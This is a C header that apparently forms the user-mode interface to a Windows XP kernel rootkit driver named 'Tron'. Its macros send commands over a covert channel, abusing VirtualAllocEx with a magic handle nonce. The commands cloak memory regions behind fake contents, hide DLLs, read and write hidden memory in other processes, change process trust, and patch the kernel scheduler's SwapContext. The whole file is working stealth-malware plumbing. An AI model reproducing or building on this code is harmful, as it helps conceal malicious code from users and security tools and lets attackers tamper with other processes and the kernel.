#ifndef _TRON_USER_H_
#define _TRON_USER_H_

#define WINXP_SP2_SWAPCONTEXT (0x404924)


// BOTH NONCES MUST MATCH DRIVER!

// should be a high number:
#define HANDLE_NONCE              ((HANDLE)0x00302533) 

// Also VirtualAlloc is finiky.. Some nonces will be filtered out
// by userland for CMD_NONCE. HANDLE_NONCE is better to tune randomly
#define CMD_NONCE		  (0x05132300) // Novus Disordo Secloeum

#define CMD_ADD_CLOAK              (CMD_NONCE+0)
#define CMD_ADD_ALLOWED            (CMD_NONCE+1)
#define CMD_REMOVE_ALLOWED         (CMD_NONCE+2)
#define CMD_REMOVE_CLOAK           (CMD_NONCE+3)
#define CMD_WRITE_HIDDEN           (CMD_NONCE+4)
#define CMD_READ_HIDDEN            (CMD_NONCE+5)
#define CMD_CHANGE_TRUST           (CMD_NONCE+6)
#define CMD_HIDE_DLL_BY_NAME       (CMD_NONCE+7)
#define CMD_HIDE_DLL_BY_HANDLE     (CMD_NONCE+8)
#define CMD_PATCH_SCHEDULER        (CMD_NONCE+9)

typedef struct _CMD_CLOAK_ARGS {
    DWORD pid;
    DWORD cloak_start; 
    DWORD cloak_end;
    DWORD fake_start;
    DWORD fake_end;
} CMD_CLOAK_ARGS;

typedef struct _CMD_ALLOWED_ARGS {
    DWORD pid;
    DWORD code_start; 
    DWORD code_end;
    DWORD cloak_start;
    DWORD cloak_end;
} CMD_ALLOWED_ARGS;

typedef struct _CMD_REMOVE_ARGS {
    DWORD pid;
    DWORD start; 
    DWORD end; 
} CMD_REMOVE_ARGS;

typedef struct _CMD_RW_ARGS {
    DWORD pid;
    DWORD dest;
    DWORD source;
    DWORD len;
} CMD_RW_ARGS;

typedef struct _CMD_CHANGE_TRUST_ARGS {
    DWORD pid;
} CMD_CHANGE_TRUST_ARGS;

typedef struct _CMD_HIDE_DLL_ARGS {
    DWORD pid;
    union {
        DWORD dll_handle;
        const wchar_t *dll_name;
    };
    DWORD fake_start;
    DWORD fake_end; // needed to verify user is not on crack
} CMD_HIDE_DLL_ARGS;

typedef struct _CMD_PATCH_SCHEDULER_ARGS {
    DWORD SwapContextIDA;
} CMD_PATCH_SCHEDULER_ARGS;

// To be called from userland. All of these do in fact make error codes
// available to GetLastError()
#define ADD_CLOAK(pid_, cloak_start_, cloak_end_, fake_start_, fake_end_) \
do { \
    CMD_CLOAK_ARGS __args; \
    __args.pid = (DWORD)(pid_); \
    __args.cloak_start = (DWORD)(cloak_start_); \
    __args.cloak_end = (DWORD)(cloak_end_); \
    __args.fake_start = (DWORD)(fake_start_); \
    __args.fake_end = (DWORD)(fake_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_ADD_CLOAK); \
} while(0)

#define ADD_ALLOWED(pid_, code_start_, code_end_, cloak_start_, cloak_end_) \
do { \
    CMD_ALLOWED_ARGS __args; \
    __args.pid = (DWORD)(pid_); \
    __args.code_start = (DWORD)(code_start_); \
    __args.code_end = (DWORD)(code_end_); \
    __args.cloak_start = (DWORD)(cloak_start_); \
    __args.cloak_end = (DWORD)(cloak_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_ADD_ALLOWED); \
} while(0)

// Works on a per-page basis. Can remove portions. Also remove associated
// permissions and unlocks memory
#define REMOVE_CLOAK(pid_, cloak_start_, cloak_end_) \
do { \
    CMD_REMOVE_ARGS __args; \
    __args.pid = (DWORD)(pid_); \
    __args.start = (DWORD)(cloak_start_); \
    __args.end = (DWORD)(cloak_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_REMOVE_CLOAK); \
} while(0)

// Entries are removed if and only if they lie entirely within this range
// DOES NOT SUBDIVIDE REGIONS
#define REMOVE_ALLOWED(pid_, code_start_, code_end_) \
do { \
    CMD_REMOVE_ARGS __args; \
    __args.pid = (DWORD)(pid_); \
    __args.start = (DWORD)(code_start_); \
    __args.end = (DWORD)(code_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_REMOVE_ALLOWED); \
} while(0)


#define HIDE_DLL_BY_NAME(pid_, wchar_name_, fake_start_, fake_end_) \
do { \
    CMD_HIDE_DLL_ARGS __args;\
    __args.pid = (DWORD)(pid_);\
    __args.dll_name = (wchar_name_);\
    __args.fake_start = (DWORD)(fake_start_);\
    __args.fake_end = (DWORD)(fake_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_HIDE_DLL_BY_NAME); \
} while(0)

#define HIDE_DLL_BY_HANDLE(pid_, dll_handle_, fake_start_, fake_end_) \
do { \
    CMD_HIDE_DLL_ARGS __args;\
    __args.pid = (DWORD)(pid_);\
    __args.dll_handle = (DWORD)(dll_handle_);\
    __args.fake_start = (DWORD)(fake_start_);\
    __args.fake_end = (DWORD)(fake_end_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_HIDE_DLL_BY_HANDLE); \
} while(0)

#define WRITE_HIDDEN(pid_, dest_, src_, write_len_) \
do { \
    CMD_RW_ARGS __args;\
    __args.pid = (DWORD)(pid_);\
    __args.dest = (DWORD)(dest_);\
    __args.source = (DWORD)(src_);\
    __args.len = (DWORD)(write_len_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_WRITE_HIDDEN); \
} while(0)

#define READ_HIDDEN(pid_, read_, outbuf_, len_) \
do { \
    CMD_RW_ARGS __args;\
    __args.pid = (DWORD)(pid_);\
    __args.dest = (DWORD)(read_);\
    __args.source = (DWORD)(outbuf_);\
    __args.len = (DWORD)(len_); \
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_READ_HIDDEN); \
} while(0)

#define CHANGE_TRUST(pid_) \
do { \
    CMD_RW_ARGS __args; \
    __args.pid = (DWORD)(pid_);\
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_CHANGE_TRUST); \
} while(0);

#define PATCH_SCHEDULER(IDASwapContextAddress_) \
do { \
    CMD_PATCH_SCHEDULER_ARGS __args; \
    __args.SwapContextIDA = IDASwapContextAddress_;\
    VirtualAllocEx(HANDLE_NONCE, &__args, 4096, MEM_COMMIT, (DWORD)CMD_PATCH_SCHEDULER); \
} while(0);

#endif
